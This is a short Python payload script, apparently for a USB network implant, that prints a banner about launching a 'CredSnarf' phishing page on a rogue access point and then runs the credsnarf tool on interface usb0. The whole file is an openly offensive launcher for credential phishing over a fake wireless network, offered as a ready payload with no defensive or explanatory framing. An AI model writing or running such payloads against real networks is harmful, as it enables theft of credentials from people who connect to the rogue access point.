# File: payloads/network/credsnarf_spoof.py
import subprocess

print("[*] Launching CredSnarf phishing page on rogue AP")
subprocess.run([
    "credsnarf",
    "-i", "usb0"
])
